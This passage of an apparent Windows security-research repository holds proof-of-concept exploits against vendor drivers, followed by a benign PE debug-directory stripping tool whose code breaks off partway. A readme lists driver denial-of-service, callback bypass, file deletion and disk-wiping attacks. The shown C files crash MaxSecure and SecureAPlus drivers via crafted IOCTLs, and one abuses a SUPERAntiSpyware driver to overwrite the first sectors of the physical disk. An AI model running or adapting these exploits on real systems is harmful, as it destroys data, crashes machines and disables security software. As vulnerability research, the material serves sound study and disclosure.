        return -1;
    }
    else {
        printf_s("[+] MaxProc64 device opened\r\n");
    }

    NTSTATUS ntStatus;

    ntStatus = CallDriver(deviceHandle,
        0x220019,
        (PVOID)0xFFFFFFFF12345678,
        0,
        NULL,
        0);

    printf_s("[+] CallDriver NTSTATUS 0x%lX\r\n", ntStatus);


    CloseHandle(deviceHandle);
}

```

`source/SecTrash/readme.txt`:

```txt
secureaplus.c - SecureAPlus AV SAScan driver Denial of Service
iobitcallbacks.c - IObit Malware Fighter ImfObCallback.sys bypass
bkavsp.c - BKAVSP Arbitrary File Deletion
superantispyware.c - SUPERAntispyware disk wiper
maxproc64.c - MaxSecure MaxProc64 driver Denial of Service
iobit_winring0.c - IOBit WinRing0 driver information disclosure
asusgio2.c - ASUS GiveIO driver unlock
logitech.c - Logitech LgCoreTemp.sys driver information disclosure
enetech.c - EneTech driver arbitrary kernel memory read/information disclosure
glckio2.c - Gigabyte glckio2 driver information disclosure/unlock

```

`source/SecTrash/secureaplus.c`:

```c
#pragma warning(disable: 4005)

#include <windows.h>
#include <strsafe.h>
#include <ntstatus.h>
#include "ntos.h"

NTSTATUS CallDriver(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG IoControlCode,
    _In_opt_ PVOID InputBuffer,
    _In_opt_ ULONG InputBufferLength,
    _In_opt_ PVOID OutputBuffer,
    _In_opt_ ULONG OutputBufferLength)
{
    BOOL bResult = FALSE;
    IO_STATUS_BLOCK ioStatus;

    return NtDeviceIoControlFile(DeviceHandle,
        NULL,
        NULL,
        NULL,
        &ioStatus,
        IoControlCode,
        InputBuffer,
        InputBufferLength,
        OutputBuffer,
        OutputBufferLength);

}

int main()
{
    NTSTATUS ntStatus;

    HANDLE deviceHandle = CreateFile(TEXT("\\\\.\\SAScan"),
        GENERIC_READ | GENERIC_WRITE,
        0,
        NULL,
        OPEN_EXISTING,
        0,
        NULL);

    if (deviceHandle == INVALID_HANDLE_VALUE) {
        printf_s("[!] Unable to open device\r\n");
#ifndef _DEBUG
        return -1;
#endif
    }
    else {
        printf_s("[+] SAScan device opened\r\n");
    }

    ntStatus = CallDriver(deviceHandle,
        0x9C40E404,
        NULL,
        0,
        NULL,
        0);

    printf_s("[~] (NTSTATUS 0x%lx)\r\n", ntStatus);

    system("pause");

    CloseHandle(deviceHandle);
}

```

`source/SecTrash/superantispyware.c`:

```c
#pragma warning(disable: 4005)

#include <windows.h>
#include <strsafe.h>
#include <ntstatus.h>
#include "ntos.h"

NTSTATUS CallDriver(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG IoControlCode,
    _In_opt_ PVOID InputBuffer,
    _In_opt_ ULONG InputBufferLength,
    _In_opt_ PVOID OutputBuffer,
    _In_opt_ ULONG OutputBufferLength)
{
    BOOL bResult = FALSE;
    IO_STATUS_BLOCK ioStatus;

    return NtDeviceIoControlFile(DeviceHandle,
        NULL,
        NULL,
        NULL,
        &ioStatus,
        IoControlCode,
        InputBuffer,
        InputBufferLength,
        OutputBuffer,
        OutputBufferLength);

}

#pragma pack(push, 1)
typedef struct _CALL_DRV {
    WCHAR DeviceName[2048];
    LARGE_INTEGER StartingOffset;       // +0x1000
    SIZE_T DataSize;                    // +0x1008
    PVOID DataPtr;                      // +0x1010
} CALL_DRV, * PCALL_DRV;
#pragma pack(pop)

ULONG u = FIELD_OFFSET(CALL_DRV, DataPtr);

#define SAS_DEVICE 0x9C40
#define IOCTL_SAS_CALLDRIVER CTL_CODE(SAS_DEVICE, 0x850, METHOD_BUFFERED, FILE_ANY_ACCESS)

int main()
{
    NTSTATUS ntStatus;
    CALL_DRV request;

    HANDLE deviceHandle = CreateFile(TEXT("\\\\.\\SASKUTIL"),
        GENERIC_READ | GENERIC_WRITE,
        0,
        NULL,
        OPEN_EXISTING,
        0,
        NULL);

    if (deviceHandle == INVALID_HANDLE_VALUE) {
        printf_s("[!] Unable to open device\r\n");
#ifndef _DEBUG
        return -1;
#endif
    }
    else {
        printf_s("[+] SASKUTIL device opened\r\n");
    }

    system("pause");

    WCHAR writeData[512];

    memset(&writeData, 0xAB, sizeof(writeData));
    RtlSecureZeroMemory(&request, sizeof(request));

    wcscpy_s(request.DeviceName, L"\\Device\\Harddisk0\\DR0");
    request.DataSize = sizeof(writeData);
    request.DataPtr = &writeData;

    for (ULONG i = 0; i < 65; i++) {

        request.StartingOffset.LowPart = (i * 512);

        ntStatus = CallDriver(deviceHandle,
            IOCTL_SAS_CALLDRIVER,
            &request,
            sizeof(CALL_DRV),
            NULL,
            0);

        printf_s("[+] CallDriver NTSTATUS 0x%lX\r\n", ntStatus);
    }

    CloseHandle(deviceHandle);
}

```

`source/StripDebug/StripDebug.sln`:

```sln

Microsoft Visual Studio Solution File, Format Version 12.00
# Visual Studio 14
VisualStudioVersion = 14.0.25420.1
MinimumVisualStudioVersion = 10.0.40219.1
Project("{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}") = "StripDebug", "StripDebug.vcxproj", "{177E3B73-F1F9-4C70-AFFF-9474DECEDAD1}"
EndProject
Global
	GlobalSection(SolutionConfigurationPlatforms) = preSolution
		Debug|x64 = Debug|x64
		Release|x64 = Release|x64
	EndGlobalSection
	GlobalSection(ProjectConfigurationPlatforms) = postSolution
		{177E3B73-F1F9-4C70-AFFF-9474DECEDAD1}.Debug|x64.ActiveCfg = Debug|x64
		{177E3B73-F1F9-4C70-AFFF-9474DECEDAD1}.Debug|x64.Build.0 = Debug|x64
		{177E3B73-F1F9-4C70-AFFF-9474DECEDAD1}.Release|x64.ActiveCfg = Release|x64
		{177E3B73-F1F9-4C70-AFFF-9474DECEDAD1}.Release|x64.Build.0 = Release|x64
	EndGlobalSection
	GlobalSection(SolutionProperties) = preSolution
		HideSolutionNode = FALSE
	EndGlobalSection
EndGlobal

```

`source/StripDebug/StripDebug.vcxproj`:

```vcxproj
<?xml version="1.0" encoding="utf-8"?>
<Project DefaultTargets="Build" ToolsVersion="15.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup Label="ProjectConfigurations">
    <ProjectConfiguration Include="Debug|Win32">
      <Configuration>Debug</Configuration>
      <Platform>Win32</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Release|Win32">
      <Configuration>Release</Configuration>
      <Platform>Win32</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Debug|x64">
      <Configuration>Debug</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Release|x64">
      <Configuration>Release</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
  </ItemGroup>
  <PropertyGroup Label="Globals">
    <ProjectGuid>{177E3B73-F1F9-4C70-AFFF-9474DECEDAD1}</ProjectGuid>
    <Keyword>Win32Proj</Keyword>
    <RootNamespace>StripDebug</RootNamespace>
    <WindowsTargetPlatformVersion>10.0.17134.0</WindowsTargetPlatformVersion>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.Default.props" />
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>true</UseDebugLibraries>
    <PlatformToolset>v141</PlatformToolset>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>false</UseDebugLibraries>
    <PlatformToolset>v141</PlatformToolset>
    <WholeProgramOptimization>true</WholeProgramOptimization>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>true</UseDebugLibraries>
    <PlatformToolset>v141</PlatformToolset>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>false</UseDebugLibraries>
    <PlatformToolset>v141</PlatformToolset>
    <WholeProgramOptimization>true</WholeProgramOptimization>
    <CharacterSet>Unicode</CharacterSet>
    <SpectreMitigation>Spectre</SpectreMitigation>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.props" />
  <ImportGroup Label="ExtensionSettings">
  </ImportGroup>
  <ImportGroup Label="Shared">
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <PropertyGroup Label="UserMacros" />
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
    <LinkIncremental>true</LinkIncremental>
    <OutDir>.\output\$(Platform)\$(Configuration)\</OutDir>
    <IntDir>.\output\$(Platform)\$(Configuration)\</IntDir>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <LinkIncremental>true</LinkIncremental>
    <OutDir>.\output\$(Platform)\$(Configuration)\</OutDir>
    <IntDir>.\output\$(Platform)\$(Configuration)\</IntDir>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
    <LinkIncremental>false</LinkIncremental>
    <OutDir>.\output\$(Platform)\$(Configuration)\</OutDir>
    <IntDir>.\output\$(Platform)\$(Configuration)\</IntDir>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <LinkIncremental>false</LinkIncremental>
    <OutDir>.\output\$(Platform)\$(Configuration)\</OutDir>
    <IntDir>.\output\$(Platform)\$(Configuration)\</IntDir>
    <CodeAnalysisRuleSet>SecurityRules.ruleset</CodeAnalysisRuleSet>
  </PropertyGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
    <ClCompile>
      <PrecompiledHeader>
      </PrecompiledHeader>
      <WarningLevel>Level4</WarningLevel>
      <Optimization>Disabled</Optimization>
      <PreprocessorDefinitions>WIN32;_DEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <SDLCheck>true</SDLCheck>
      <CompileAs>CompileAsC</CompileAs>
      <ExceptionHandling>false</ExceptionHandling>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <GenerateDebugInformation>true</GenerateDebugInformation>
      <EntryPointSymbol>main</EntryPointSymbol>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <ClCompile>
      <PrecompiledHeader>
      </PrecompiledHeader>
      <WarningLevel>Level4</WarningLevel>
      <Optimization>Disabled</Optimization>
      <PreprocessorDefinitions>_DEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <SDLCheck>true</SDLCheck>
      <CompileAs>CompileAsC</CompileAs>
      <ExceptionHandling>false</ExceptionHandling>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <GenerateDebugInformation>true</GenerateDebugInformation>
      <EntryPointSymbol>main</EntryPointSymbol>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
    <ClCompile>
      <WarningLevel>Level4</WarningLevel>
      <PrecompiledHeader>
      </PrecompiledHeader>
      <Optimization>MinSpace</Optimization>
      <FunctionLevelLinking>true</FunctionLevelLinking>
      <IntrinsicFunctions>true</IntrinsicFunctions>
      <PreprocessorDefinitions>WIN32;NDEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <SDLCheck>true</SDLCheck>
      <RuntimeLibrary>MultiThreaded</RuntimeLibrary>
      <CompileAs>CompileAsC</CompileAs>
      <FavorSizeOrSpeed>Size</FavorSizeOrSpeed>
      <MultiProcessorCompilation>true</MultiProcessorCompilation>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <EnableCOMDATFolding>true</EnableCOMDATFolding>
      <OptimizeReferences>true</OptimizeReferences>
      <GenerateDebugInformation>false</GenerateDebugInformation>
      <EntryPointSymbol>main</EntryPointSymbol>
      <SetChecksum>true</SetChecksum>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <ClCompile>
      <WarningLevel>Level4</WarningLevel>
      <PrecompiledHeader>
      </PrecompiledHeader>
      <Optimization>MinSpace</Optimization>
      <FunctionLevelLinking>true</FunctionLevelLinking>
      <IntrinsicFunctions>true</IntrinsicFunctions>
      <PreprocessorDefinitions>NDEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <SDLCheck>true</SDLCheck>
      <CompileAs>CompileAsC</CompileAs>
      <FavorSizeOrSpeed>Size</FavorSizeOrSpeed>
      <MultiProcessorCompilation>true</MultiProcessorCompilation>
      <StringPooling>true</StringPooling>
      <ControlFlowGuard>Guard</ControlFlowGuard>
      <RuntimeLibrary>MultiThreaded</RuntimeLibrary>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <EnableCOMDATFolding>true</EnableCOMDATFolding>
      <OptimizeReferences>true</OptimizeReferences>
      <GenerateDebugInformation>false</GenerateDebugInformation>
      <EntryPointSymbol>main</EntryPointSymbol>
      <SetChecksum>true</SetChecksum>
    </Link>
  </ItemDefinitionGroup>
  <ItemGroup>
    <ClCompile Include="cui.c" />
    <ClCompile Include="main.c" />
    <ClCompile Include="minirtl\cmdline.c" />
    <ClCompile Include="minirtl\_strcat.c" />
    <ClCompile Include="minirtl\_strcpy.c" />
    <ClCompile Include="minirtl\_strlen.c" />
  </ItemGroup>
  <ItemGroup>
    <ClInclude Include="cui.h" />
    <ClInclude Include="global.h" />
    <ClInclude Include="minirtl\cmdline.h" />
    <ClInclude Include="minirtl\minirtl.h" />
    <ClInclude Include="minirtl\rtltypes.h" />
  </ItemGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.targets" />
  <ImportGroup Label="ExtensionTargets">
  </ImportGroup>
</Project>
```

`source/StripDebug/StripDebug.vcxproj.filters`:

```filters
<?xml version="1.0" encoding="utf-8"?>
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup>
    <Filter Include="Source Files">
      <UniqueIdentifier>{4FC737F1-C7A5-4376-A066-2A32D752A2FF}</UniqueIdentifier>
      <Extensions>cpp;c;cc;cxx;def;odl;idl;hpj;bat;asm;asmx</Extensions>
    </Filter>
    <Filter Include="Header Files">
      <UniqueIdentifier>{93995380-89BD-4b04-88EB-625FBE52EBFB}</UniqueIdentifier>
      <Extensions>h;hh;hpp;hxx;hm;inl;inc;xsd</Extensions>
    </Filter>
    <Filter Include="Resource Files">
      <UniqueIdentifier>{67DA6AB6-F800-4c08-8B7A-83BB121AAD01}</UniqueIdentifier>
      <Extensions>rc;ico;cur;bmp;dlg;rc2;rct;bin;rgs;gif;jpg;jpeg;jpe;resx;tiff;tif;png;wav;mfcribbon-ms</Extensions>
    </Filter>
    <Filter Include="minirtl">
      <UniqueIdentifier>{a2258c3e-0c10-4091-bb15-4cfbc255d0c5}</UniqueIdentifier>
    </Filter>
  </ItemGroup>
  <ItemGroup>
    <ClCompile Include="main.c">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="cui.c">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="minirtl\_strcat.c">
      <Filter>minirtl</Filter>
    </ClCompile>
    <ClCompile Include="minirtl\_strcpy.c">
      <Filter>minirtl</Filter>
    </ClCompile>
    <ClCompile Include="minirtl\_strlen.c">
      <Filter>minirtl</Filter>
    </ClCompile>
    <ClCompile Include="minirtl\cmdline.c">
      <Filter>minirtl</Filter>
    </ClCompile>
  </ItemGroup>
  <ItemGroup>
    <ClInclude Include="cui.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="minirtl\minirtl.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="minirtl\rtltypes.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="global.h">
      <Filter>minirtl</Filter>
    </ClInclude>
    <ClInclude Include="minirtl\cmdline.h">
      <Filter>Header Files</Filter>
    </ClInclude>
  </ItemGroup>
</Project>
```

`source/StripDebug/StripDebug.vcxproj.user`:

```user
<?xml version="1.0" encoding="utf-8"?>
<Project ToolsVersion="14.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
    <LocalDebuggerCommandArguments>C:\MAKEEXE\StripDebug\StripDebug\test.exe</LocalDebuggerCommandArguments>
    <DebuggerFlavor>WindowsLocalDebugger</DebuggerFlavor>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <LocalDebuggerCommandArguments>C:\MAKEEXE\StripDebug\StripDebug\test.exe</LocalDebuggerCommandArguments>
    <DebuggerFlavor>WindowsLocalDebugger</DebuggerFlavor>
  </PropertyGroup>
</Project>
```

`source/StripDebug/cui.c`:

```c
/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2016 - 2018
*
*  TITLE:       CUI.C
*
*  VERSION:     1.30
*
*  DATE:        01 Aug 2018
*
*  Console output.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/
#include "global.h"

HANDLE g_ConOut = NULL, g_ConIn = NULL;
BOOL   g_ConsoleOutput = FALSE;
WCHAR  g_BE = 0xFEFF;

/*
* cuiInitialize
*
* Purpose:
*
* Initialize console input/output.
*
*/
VOID cuiInitialize(
    _In_ BOOL InitInput,
    _Out_opt_ PBOOL IsConsoleOutput
)
{
    ULONG dummy;

    g_ConOut = GetStdHandle(STD_OUTPUT_HANDLE);

    if (InitInput) g_ConIn = GetStdHandle(STD_INPUT_HANDLE);

    SetConsoleMode(g_ConOut, ENABLE_LINE_INPUT | ENABLE_ECHO_INPUT | ENABLE_PROCESSED_OUTPUT);

    g_ConsoleOutput = TRUE;
    if (!GetConsoleMode(g_ConOut, &dummy)) {
        g_ConsoleOutput = FALSE;
        WriteFile(g_ConOut, &g_BE, sizeof(WCHAR), &dummy, NULL);
    }

    if (IsConsoleOutput)
        *IsConsoleOutput = g_ConsoleOutput;

    return;
}

/*
* cuiClrScr
*
* Purpose:
*
* Clear screen.
*
*/
VOID cuiClrScr(
    VOID
)
{
    COORD coordScreen;
    DWORD cCharsWritten;
    DWORD dwConSize;
    CONSOLE_SCREEN_BUFFER_INFO csbi;

    coordScreen.X = 0;
    coordScreen.Y = 0;

    if (!GetConsoleScreenBufferInfo(g_ConOut, &csbi))
        return;

    dwConSize = csbi.dwSize.X * csbi.dwSize.Y;

    if (!FillConsoleOutputCharacter(g_ConOut, TEXT(' '),
        dwConSize, coordScreen, &cCharsWritten))
        return;

    if (!GetConsoleScreenBufferInfo(g_ConOut, &csbi))
        return;

    if (!FillConsoleOutputAttribute(g_ConOut, csbi.wAttributes,
        dwConSize, coordScreen, &cCharsWritten))
        return;

    SetConsoleCursorPosition(g_ConOut, coordScreen);
}

/*
* cuiPrintTextA
*
* Purpose:
*
* Output text to the console or file.
* ANSI version.
*
*/
VOID cuiPrintTextA(
    _In_ LPSTR lpText,
    _In_ BOOL UseReturn
)
{
    SIZE_T consoleIO;
    DWORD bytesIO;
    LPSTR Buffer;

    if (lpText == NULL)
        return;

    consoleIO = _strlen_a(lpText);
    if ((consoleIO == 0) || (consoleIO > MAX_PATH * 4))
        return;

    consoleIO = 5 + consoleIO;
    Buffer = (LPSTR)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, consoleIO);
    if (Buffer) {

        _strcpy_a(Buffer, lpText);
        if (UseReturn) _strcat_a(Buffer, "\r\n");

        consoleIO = _strlen_a(Buffer);

        if (g_ConsoleOutput != FALSE) {
            WriteConsoleA(g_ConOut, Buffer, (DWORD)consoleIO, &bytesIO, NULL);
        }
        else {
            WriteFile(g_ConOut, Buffer, (DWORD)consoleIO, &bytesIO, NULL);
        }
        HeapFree(GetProcessHeap(), 0, Buffer);
    }
}

/*
* cuiPrintTextW
*
* Purpose:
*
* Output text to the console or file.
* UNICODE version.
*
*/
VOID cuiPrintTextW(
	_In_ LPWSTR lpText,
	_In_ BOOL UseReturn
	)
{
	SIZE_T consoleIO;
	DWORD bytesIO;
	LPWSTR Buffer;

	if (lpText == NULL)
		return;

	consoleIO = _strlen_w(lpText);
	if ((consoleIO == 0) || (consoleIO > MAX_PATH * 4))
		return;

	consoleIO = consoleIO * sizeof(WCHAR) + 4 + sizeof(UNICODE_NULL);
	Buffer = (LPWSTR)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, consoleIO);
	if (Buffer) {

		_strcpy(Buffer, lpText);
		if (UseReturn) _strcat_w(Buffer, TEXT("\r\n"));

		consoleIO = _strlen_w(Buffer);

		if (g_ConsoleOutput != FALSE) {
			WriteConsoleW(g_ConOut, Buffer, (DWORD)consoleIO, &bytesIO, NULL);
		}
		else {
			WriteFile(g_ConOut, Buffer, (DWORD)(consoleIO * sizeof(WCHAR)), &bytesIO, NULL);
		}
		HeapFree(GetProcessHeap(), 0, Buffer);
	}
}

/*
* cuiPrintTextLastErrorA
*
* Purpose:
*
* Output LastError translated code to the console or file.
* ANSI version.
*
*/
VOID cuiPrintTextLastErrorA(
    _In_ BOOL UseReturn
    )
{
    CHAR szTextBuffer[512];
    DWORD dwLastError = GetLastError();
    
    FormatMessageA(FORMAT_MESSAGE_FROM_SYSTEM, NULL, dwLastError, LANG_USER_DEFAULT, (LPSTR)&szTextBuffer, 512, NULL);
    cuiPrintTextA(szTextBuffer, UseReturn);
}

/*
* cuiPrintTextLastErrorW
*
* Purpose:
*
* Output LastError translated code to the console or file.
* UNICODE version.
*
*/
VOID cuiPrintTextLastErrorW(
    _In_ BOOL UseReturn
)
{
    WCHAR szTextBuffer[512];
    DWORD dwLastError = GetLastError();

    FormatMessageW(FORMAT_MESSAGE_FROM_SYSTEM, NULL, dwLastError, LANG_USER_DEFAULT, (LPWSTR)&szTextBuffer, 512, NULL);
    cuiPrintTextW(szTextBuffer, UseReturn);
}

```

`source/StripDebug/cui.h`:

```h
/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2016 - 2018
*
*  TITLE:       CUI.H
*
*  VERSION:     1.30
*
*  DATE:        01 Aug 2018
*
*  Common header file for console ui.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/
#pragma once

VOID cuiInitialize(
    _In_ BOOL InitInput,
    _Out_opt_ PBOOL IsConsoleOutput
    );

#ifdef _UNICODE
#define cuiPrintText cuiPrintTextW
#define cuiPrintTextLastError cuiPrintTextLastErrorW
#else
#define cuiPrintText cuiPrintTextA
#define cuiPrintTextLastError cuiPrintTextLastErrorA
#endif


VOID cuiPrintTextA(
    _In_ LPSTR lpText,
    _In_ BOOL UseReturn
    );

VOID cuiPrintTextW(
	_In_ LPWSTR lpText,
	_In_ BOOL UseReturn
	);

VOID cuiPrintTextLastErrorA(
    _In_ BOOL UseReturn
    );

VOID cuiPrintTextLastErrorW(
    _In_ BOOL UseReturn
    );

VOID cuiClrScr(
    VOID
    );

```

`source/StripDebug/global.h`:

```h
#pragma once

//disable nonmeaningful warnings.
#pragma warning(disable: 4091) //'typedef ': ignored on left of '' when no variable is declared
#pragma warning(disable: 4005) // macro redefinition
#pragma warning(disable: 4201) // nonstandard extension used : nameless struct/union
#pragma warning(disable: 4054) // %s : from function pointer %s to data pointer %s
#pragma warning(disable: 6102) // Using %s from failed function call at line %u

#include <Windows.h>
#include <DbgHelp.h>
#include "cui.h"
#include "minirtl\minirtl.h"
#include "minirtl\cmdline.h"

#pragma comment(lib, "dbghelp.lib")
#pragma comment(lib, "imagehlp.lib")

#if !defined UNICODE
#error ANSI build is not supported
#endif

#if defined (_MSC_VER)
#if (_MSC_VER >= 1910)
#ifdef _DEBUG
#pragma comment(lib, "vcruntimed.lib")
#pragma comment(lib, "ucrtd.lib")
#else
#pragma comment(lib, "libucrt.lib")
#pragma comment(lib, "libvcruntime.lib")
#endif
#endif
#endif

#define IMAGE_DEBUG_TYPE_POGO 13

PIMAGE_NT_HEADERS WINAPI CheckSumMappedFile(
    _In_ PVOID BaseAddress,
    _In_ DWORD FileLength,
    _Out_ PDWORD HeaderSum,
    _Out_ PDWORD CheckSum
);


```

`source/StripDebug/main.c`:

```c
#include "global.h"

void ProcessFile(
    LPSTR lpFileName
)
{
    HANDLE  hFile = INVALID_HANDLE_VALUE;
    HANDLE  hFileMap = NULL;
    DWORD   FileSize;
    LPVOID  ImageBase = NULL;

    INT i, cEntries;

    PIMAGE_OPTIONAL_HEADER32    oh32 = NULL;
    PIMAGE_OPTIONAL_HEADER64    oh64 = NULL;
    PIMAGE_SECTION_HEADER       SectionHeader = NULL;

    ULONG DebugDirRva, DebugDirSize, Offset, CurrentCheckSum, NewCheckSum;

    IMAGE_NT_HEADERS *NtHeaders = NULL;
    IMAGE_DEBUG_DIRECTORY *DebugDirectory;
    LPBYTE pDebugInfo;

    __try {

        hFile = CreateFileA(lpFileName, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
        if (hFile == INVALID_HANDLE_VALUE) {
            cuiPrintTextA("Cannot open input file", TRUE);
            __leave;
        }

        FileSize = GetFileSize(hFile, NULL);
        if (FileSize == 0) {
            cuiPrintTextA("Input file is empty", TRUE);
            __leave;
        }

        hFileMap = CreateFileMapping(hFile, NULL, PAGE_READWRITE, 0, 0, NULL);
        if (hFileMap == NULL) {
            cuiPrintTextA("CreateFileMapping failed for input file", TRUE);
            __leave;
        }

        ImageBase = MapViewOfFile(hFileMap, FILE_MAP_WRITE, 0, 0, 0);
        if (ImageBase == NULL) {
            cuiPrintTextA("MapViewOfFile failed for input file", TRUE);
            __leave;
        }

        NtHeaders = ImageNtHeader(ImageBase);
        if (NtHeaders == NULL) {
            cuiPrintTextA("ImageNtHeaders failed for input file", TRUE);
            __leave;
        }

        oh32 = (PIMAGE_OPTIONAL_HEADER32)&NtHeaders->OptionalHeader;
        oh64 = (PIMAGE_OPTIONAL_HEADER64)oh32;

        if ((NtHeaders->FileHeader.Machine != IMAGE_FILE_MACHINE_AMD64) && (NtHeaders->FileHeader.Machine != IMAGE_FILE_MACHINE_I386)) {
            cuiPrintTextA("Unsuported FileHeader.Machine value", TRUE);
            __leave;
        }

        if (NtHeaders->FileHeader.Machine == IMAGE_FILE_MACHINE_AMD64) {
            DebugDirRva = oh64->DataDirectory[IMAGE_DIRECTORY_ENTRY_DEBUG].VirtualAddress;
            if (DebugDirRva == 0) {
                cuiPrintTextA("DebugDirectory address not set", TRUE);
                __leave;
            }
            else {
                cuiPrintTextA("Setting DebugDirectory.VirtualAddress to zero", TRUE);
                oh64->DataDirectory[IMAGE_DIRECTORY_ENTRY_DEBUG].VirtualAddress = 0;
            }

            DebugDirSize = oh64->DataDirectory[IMAGE_DIRECTORY_ENTRY_DEBUG].Size;
            if (DebugDirSize == 0) {
                cuiPrintTextA("DebugDirectory is zero size", TRUE);
                __leave;
            }
            else {
                cuiPrintTextA("Setting DebugDirectory.Size to zero", TRUE);
                oh64->DataDirectory[IMAGE_DIRECTORY_ENTRY_DEBUG].Size = 0;
            }
        }
        else {
            DebugDirRva = oh32->DataDirectory[IMAGE_DIRECTORY_ENTRY_DEBUG].VirtualAddress;
            if (DebugDirRva == 0) {
                cuiPrintTextA("DebugDirectory address not set", TRUE);
                __leave;
            }
            else {
                cuiPrintTextA("Setting DebugDirectory.VirtualAddress to zero", TRUE);
                oh32->DataDirectory[IMAGE_DIRECTORY_ENTRY_DEBUG].VirtualAddress = 0;
            }

            DebugDirSize = oh32->DataDirectory[IMAGE_DIRECTORY_ENTRY_DEBUG].Size;
            if (DebugDirSize == 0) {
                cuiPrintTextA("DebugDirectory is zero size", TRUE);
                __leave;
            }
            else {
